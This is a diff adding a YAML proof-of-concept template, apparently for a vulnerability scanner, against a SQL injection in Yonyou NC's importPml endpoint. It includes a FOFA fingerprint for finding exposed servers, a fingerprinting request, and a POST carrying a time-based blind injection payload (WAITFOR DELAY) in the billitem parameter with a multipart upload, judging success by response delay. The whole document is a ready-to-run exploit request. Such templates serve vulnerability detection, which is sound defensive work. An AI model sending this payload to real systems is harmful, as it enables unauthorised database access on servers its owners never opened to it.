@@ -1,0 +1,44 @@
+id: poc-yaml-yongyou-nc-importpml-sqli
+info:
+  name: 用友 NC importPml SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: icon_hash="1085941792" && body="/logo/images/logo.gif"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /index.jsp
+  expression: status_code == 200 && contains(body,"<TITLE>Yonyou NC</TITLE>")
+- method: POST
+  path: /portal/pt/portalpage/importPml?pageId=login&billitem=1'WAITFOR+DELAY+'0:0:{{.t1}}'--
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH970hbttBhoCyj9V
+  data: '------WebKitFormBoundaryH970hbttBhoCyj9V
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
+
+    Content-Type: image/jpeg
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <page template="adminonerow" version="101"  i18nname="admin-00001"  visibility="0"  isdefault="true"
+    skin="webclassic" level="0"  linkgroup="0000z010000000000002" ordernum="15">
+
+    </page>
+
+    ------WebKitFormBoundaryH970hbttBhoCyj9V--'
+  expression: 'status_code == 200 &&
+
+    !contains(body,"<") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
